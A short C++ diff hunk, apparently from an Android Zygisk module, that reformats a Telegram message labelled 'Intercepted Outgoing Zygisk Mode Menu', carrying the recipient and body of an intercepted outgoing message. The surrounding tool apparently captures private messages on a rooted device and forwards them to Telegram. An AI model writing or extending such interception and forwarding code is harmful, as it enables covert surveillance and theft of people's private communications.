@@ -159,12 +159,16 @@ void* tg_worker(void* arg) {
             }
             return o;
         };
-        // Screenshot: bold headers + HTML <code> = Telegram tap-to-copy
-        std::string text = "<b>Intercepted Outgoing Zygisk Mode Menu</b>\n";
-        text += "<b>By @Hivirtus \xF0\x9F\x94\xA5</b>\n\n";
-        text += "To (Tap to copy):\n<code>";
+        // First screenshot spacing — blank line gaps + tap-to-copy
+        std::string text = "\xF0\x9F\x93\xB1 <b>Intercepted Outgoing Zygisk Mode Menu By @Hivirtus \xF0\x9F\x94\xA5</b>\n";
+        text += "\n";
+        text += "To (Tap to copy):\n";
+        text += "<code>";
         text += html_esc(to_disp);
-        text += "</code>\n\nBody (Tap to copy):\n<code>";
+        text += "</code>\n";
+        text += "\n";
+        text += "Body (Tap to copy):\n";
+        text += "<code>";
         text += html_esc(msg);
         text += "</code>";
 
